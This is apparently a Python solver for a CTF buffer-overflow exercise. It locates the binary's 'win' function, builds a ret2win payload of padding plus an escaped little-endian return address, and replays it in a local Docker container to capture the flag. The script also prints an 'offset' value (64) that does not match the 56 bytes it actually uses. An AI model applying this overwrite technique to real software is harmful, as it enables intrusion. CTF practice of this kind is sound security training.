#!/usr/bin/env python3
"""Replay NUS Welcome CTF Stack BOF School in a local Linux container.

This helper is for local or explicitly authorized CTF challenge artifacts. The
challenge teaches ret2win with an input layer that accepts literal `\\hh` hex
escapes, so the replay sends padding plus the little-endian `win` address as
escaped bytes and captures the flag from the local service directory.
"""

from __future__ import annotations

import argparse
import re
import shutil
import struct
import subprocess
import sys
from pathlib import Path


FLAG_RE = re.compile(r"(?i)(?:grey|flag|ctf)\{[^{}\r\n]{3,300}\}")
PLACEHOLDER_MARKERS = ("FLAG_FOR_TESTING", "TEST_FLAG", "DUMMY", "PLACEHOLDER")


def build_payload(win_addr: int, offset: int = 56) -> bytes:
    escaped_addr = b"".join(f"\\{byte:02x}".encode() for byte in struct.pack("<Q", win_addr))
    return b"A" * offset + escaped_addr + b"\n"


def extract_flags(text: str) -> list[str]:
    flags: list[str] = []
    for match in FLAG_RE.finditer(text):
        candidate = match.group(0)
        if any(marker in candidate.upper() for marker in PLACEHOLDER_MARKERS):
            continue
        if candidate not in flags:
            flags.append(candidate)
    return flags


def find_symbol(binary: Path, symbol: str = "win") -> int:
    objdump = shutil.which("objdump")
    if not objdump:
        raise RuntimeError("objdump is required to locate the win symbol")
    completed = subprocess.run(
        [objdump, "-t", str(binary)],
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    pattern = re.compile(rf"^([0-9a-fA-F]+)\s+\w+\s+F\s+\S+\s+[0-9a-fA-F]+\s+{re.escape(symbol)}$")
    for line in completed.stdout.splitlines():
        match = pattern.match(line.strip())
        if match:
            return int(match.group(1), 16)
    raise RuntimeError(f"could not locate symbol {symbol!r} in {binary}")


def solve_challenge_dir(challenge_dir: Path, image: str = "ubuntu:22.04", timeout: float = 20.0) -> str:
    docker = shutil.which("docker")
    if not docker:
        raise RuntimeError("docker is required to replay the Linux challenge binary")
    binary = challenge_dir / "challenge"
    flag_file = challenge_dir / "flag.txt"
    if not binary.exists():
        raise FileNotFoundError(f"missing challenge binary: {binary}")
    if not flag_file.exists():
        raise FileNotFoundError(f"missing local flag file: {flag_file}")
    win_addr = find_symbol(binary, "win")
    payload = build_payload(win_addr)
    command = [
        docker,
        "run",
        "--rm",
        "-i",
        "--platform",
        "linux/amd64",
        "-v",
        f"{challenge_dir}:/work:ro",
        "-w",
        "/work",
        image,
        "./challenge",
    ]
    completed = subprocess.run(
        command,
        input=payload,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=timeout,
        check=False,
    )
    text = completed.stdout.decode("utf-8", errors="replace")
    flags = extract_flags(text)
    if not flags:
        raise RuntimeError(f"no non-placeholder flag found in transcript: {text[-400:]!r}")
    print(f"win_addr: 0x{win_addr:x}")
    print(f"offset: {len(payload) - 1 - 8 * 3}")
    print("method: ret2win return-address overwrite through escaped hex byte input")
    print(f"flag: {flags[0]}")
    return flags[0]


def main() -> int:
    parser = argparse.ArgumentParser(description="Replay NUS Stack BOF School from local CTF artifacts.")
    parser.add_argument("--challenge-dir", type=Path, required=True, help="directory containing challenge and flag.txt")
    parser.add_argument("--image", default="ubuntu:22.04", help="Linux container image used to run the ELF")
    parser.add_argument("--timeout", type=float, default=20.0)
    args = parser.parse_args()
    try:
        solve_challenge_dir(args.challenge_dir.resolve(), image=args.image, timeout=args.timeout)
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
